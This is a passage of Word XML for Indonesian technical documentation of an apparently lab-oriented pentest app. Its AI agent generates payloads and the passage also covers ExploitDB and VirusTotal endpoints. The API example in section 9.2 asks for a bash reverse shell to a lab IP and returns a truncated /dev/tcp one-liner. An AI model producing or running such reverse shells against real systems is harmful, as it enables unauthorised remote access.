        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>9. Kontrak API</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t xml:space="preserve">9.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:color w:val="142B45"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>GET /healthz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{"status": "ok"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t xml:space="preserve">9.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:color w:val="142B45"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>POST /api/v1/agent/execute</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Request: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{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "prompt": "Buat reverse shell bash untuk 10.10.14.8:9001",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "session_id": "opsional-uuid",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "context": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "lhost": "10.10.14.8",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "lport": 9001,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "target": "10.10.14.20",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "target_os": "linux",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "scan_data": "opsional teks Nmap/JWT"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Response: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{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "session_id": "uuid",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "response": "Penjelasan...",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "code_blocks": [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {"language": "bash", "code": "bash -i &gt;&amp; /dev/tcp/...", "payload_type": "reverse_shell"}</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ],</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "tools_used": ["generate_reverse_shell"],</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "elapsed_ms": 812</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Validasi: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>prompt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1–4000 karakter, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>lport</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1–65535, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>lhost</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> IPv4,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>scan_data</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> dibatasi panjangnya dan disanitasi. Error validasi memakai</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ErrorResponse</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> terstruktur, bukan stack trace.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t xml:space="preserve">9.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:color w:val="142B45"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>GET /api/v1/exploitdb/search?q=...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Mengembalikan katalog ExploitDB yang cocok. Query kosong/terlalu pendek</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>ditolak.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>9.4 Endpoint VirusTotal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Method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Path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Fungsi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/api/v1/virustotal/status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Status konfigurasi key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/api/v1/virustotal/urls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Scan URL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/api/v1/virustotal/files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Upload file (batas ukuran)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/api/v1/virustotal/analyses/{id}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Status analisis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/api/v1/virustotal/files/{hash}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file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/api/v1/virustotal/url-report?url=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URL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/api/v1/virustotal/domains/{domain}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domain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/api/v1/virustotal/ips/{ip}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IP</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Semua endpoint memerlukan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>VIRUSTOTAL_API_KEY</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (dari env atau header yang</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>diteruskan klien). Upload bersifat publik ke komunitas VirusTotal.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>10. State Management dan Responsivitas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Provider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Tipe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Tanggung jawab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secureStorageProvider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Singleton storage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dioClientProvider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Klien HTTP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payloadRepositoryProvider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Kontrak repository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activityRepositoryProvider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terenkripsi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historyControllerProvider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StateNotifierProvider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Daftar riwayat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navigationControllerProvider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StateNotifierProvider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Halaman aktif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scriptGeneratorControllerProvider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StateNotifierProvider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Payload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studioControllerProvider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StateNotifierProvider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Konfigurasi studio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telemetryControllerProvider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StateNotifierProvider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Metrik monitoring</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Breakpoint: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Lebar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Perilaku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&lt; 700 px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Bottom navigation, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="9C270B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>SafeArea</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>, padding 14 px, tanpa footer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700–999 px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Sidebar ringkas, dashboard satu kolom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≥ 1000 px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Sidebar penuh, dashboard tiga kolom, footer status</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Perubahan state memakai </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ref.watch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">; aksi memakai </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ref.read(...notifier)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Controller tidak menyimpan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>BuildContext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>, sehingga dapat diuji tanpa widget.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>11. Pengujian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analyze</w:t>
        <w:br/>
        <w:t>flutter test</w:t>
        <w:br/>
        <w:t>flutter test test/widget_test.dart --reporter expanded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Berkas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Fokus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validators_test.dart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IPv4 valid/invalid, port, pesan error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activity_history_test.dart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JSON, data rusak, urutan, batas 40, kegagalan simpan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widget_test.dart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Desktop 1440×900, ponsel 390×844, navigasi, form, riwayat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assets_test.dart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kredensial ter-bundle</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Menambah test riwayat memakai fake repository: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class InMemoryActivityRepository implements ActivityRepository {</w:t>
        <w:br/>
        <w:t xml:space="preserve">  List&lt;ActivityEntry&gt; entries = &lt;ActivityEntry&gt;[];</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  @override</w:t>
        <w:br/>
        <w:t xml:space="preserve">  Future&lt;List&lt;ActivityEntry&gt;&gt; load() async =&gt; List.of(entries);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  @override</w:t>
        <w:br/>
        <w:t xml:space="preserve">  Future&lt;void&gt; save(List&lt;ActivityEntry&gt; value) async {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    entries = List.of(value);</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>12. Keamanan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Risiko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Mitigasi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API key bocor dari APK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Tidak ada key di </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="9C270B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>assets/</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>; key di secure storage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Riwayat berisi payload sensitif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Disimpan terenkripsi, bukan SharedPreferences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Input berbahaya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IPv4/port + sanitasi server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Penyalahgunaan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Peringatan etika di README, About, dan prompt agent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HTTP cleartext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Hanya diizinkan untuk lab; dokumentasi menyarankan HTTPS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Data rusak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Parser defensif; aplikasi tetap berjalan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Yang </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tidak</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> dijamin: keamanan perangkat yang sudah di-root, malware dengan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>akses ke proses aplikasi, atau kebocoran melalui clipboard setelah pengguna</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>menyalin payload.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rP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Gejala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Pemeriksaan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Solusi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Aplikasi menampilkan error koneksi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curl http://127.0.0.1:8000/healthz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Jalankan Uvicorn; cek URL target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Android tidak terhubung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devices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Emulator pakai </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="9C270B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>10.0.2.2</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>, fisik pakai IP LAN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test</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> gagal karena plugin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Fake repository terpasang?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Gunakan fake, jangan plugin native di unit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Teks terpotong/overflow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Uji viewport 390 px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Gunakan </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="9C270B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Expanded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color w:val="9C270B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Wrap</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>, bukan lebar tetap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APK gagal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doctor -v</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>, versi JDK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JDK 20 + Gradle 8.14.3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tidak muncul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Key </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="9C270B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>activity_log</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> ada?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Generate payload baru; cek log storage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Analyzer complaint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dart fix --dry-run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Perbaiki manual; jangan turunkan aturan lint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14. Pemeliharaan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Jalankan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>flutter analyze</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> dan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>flutter test</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sebelum setiap commit.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Perbarui </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>CHANGELOG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>/README bila perilaku berubah.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Jangan commit: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.env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key.properties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*.jks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build/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*.log</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>docx_dump.txt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Untuk menambah jenis aktivitas baru: tambahkan nilai </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ActivityKind</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">label, dan pemanggilan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>HistoryController.add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Untuk mengganti backend: implementasikan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>PayloadRepository</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> dan ganti</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>provider; lapisan presentasi tidak perlu diubah.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>15. Status Verifikasi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Klaim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Analyzer bersih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16 test lulus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APK build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Berkas + log build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Skema storage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secure_storage_service.dart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activity_entry.dart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Endpoint backend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backend/app/main.py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Instalasi perangkat fisik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dicatat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Uji end-to-end dengan LLM key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dijalankan penuh</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>VERDICT: approve</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> — dokumentasi teknis sesuai kode yang ada; dua butir</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>lapangan ditandai terbuka.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